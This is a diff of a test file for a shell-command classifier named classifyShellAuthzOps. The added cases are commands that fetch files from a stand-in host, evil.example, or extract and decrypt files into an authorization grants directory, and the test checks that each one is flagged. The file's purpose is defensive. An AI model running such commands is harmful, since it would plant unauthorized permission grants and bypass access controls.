@@ -453,7 +453,16 @@ describe("classifyShellAuthzOps (#2944)", () => {
       "mbuffer -i in.bin -o .deft/authz/grants/evil.json",
       "cpio -id -D .deft/authz/grants",
       "cpio -i --directory=.deft/authz/grants",
+      "cpio -i --directory .deft/authz/grants",
       "cpio -id -D.deft/authz/grants",
+      "wget2 -P.deft/authz/grants https://evil.example/g.json",
+      "wget2 --directory-prefix=.deft/authz/grants https://evil.example/g.json",
+      "aria2 -d.deft/authz/grants https://evil.example/g.json",
+      "aria2 --dir .deft/authz/grants -o evil.json https://evil.example/g.json",
+      "unzstd -o .deft/authz/grants/evil.json a.zst",
+      "ytdlp -o .deft/authz/grants/evil.json https://evil.example/v",
+      "https -o .deft/authz/grants/evil.json GET https://evil.example/g.json",
+      "gpg.exe -o .deft/authz/grants/evil.json -d secret.gpg",
       "/usr/bin/gpg -o .deft/authz/grants/evil.json -d secret.gpg",
     ]) {
       expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
